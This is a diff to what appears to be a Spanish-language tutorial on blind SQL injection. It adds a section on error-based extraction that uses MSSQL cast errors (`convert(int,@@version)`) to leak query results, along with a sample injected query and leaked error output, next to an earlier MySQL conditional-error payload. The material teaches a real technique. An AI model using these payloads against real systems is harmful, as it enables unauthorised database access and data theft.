@@ -36,3 +36,31 @@ Información básica sobre variantes de sintaxis para generar errores condiciona
 | MySQL | `SELECT IF(YOUR-CONDITION-HERE,(SELECT table_name FROM information_schema.tables),'a')` |
 
 La sintaxis no siempre va a ser tan directa de aplicar y la interpretación de algunos paréntesis o condiciones de error pueden cambiar para un mismo DBMS en diferentes versiones.
+
+## Hacer ver al ciego
+
+En una inyección ciega, extraer contenido por deducciones y errores es parecido a decirle al oído del ciego cómo se ve el resultado. Pero mejor es hacerlo ver.
+
+Existen técnicas que permiten devolver **el resultado de la consulta en el propio error**. La más simple es **provocar errores de conversión o *cast*** que indiquen que el resultado parcial, ya procesado por el DBMS, no es convertible. Por ejemplo, la siguiente línea intenta convertir a númerico un *string* que debería tener la versión del DBMS:
+
+``` sql 
+1=convert(int,@@version)--
+```
+
+Aplicado a una de las consultas de ejemplo anteriores:
+
+```sql 
+SELECT TrackingId FROM TrackedUsers WHERE 
+    TrackingId = 'PeniarolONacionalTantoMeDa' AND 1=convert(int,@@version)--'
+```
+
+Puede generar el siguiente error como respuesta:
+
+```
+Error: Warning: mssql_query() message: Conversion failed when converting the nvarchar value 
+"Microsoft SQL Server 2012 (SP1) - 110.0.3156.0 (X64) Copyright (c) Microsoft Corporation 
+Standard Edition (64-bit) on Windows NT 6.2 X64 (Build 9200: ) (Hypervisor)" to data type 
+int. (severity 16 in D:\something\web\STD...\id.php on line...
+```
+
+Si esto sucede, no hay más ceguera. Es cuestión de extraer el resultado directamente como en una inyección clásica con datos visbles.
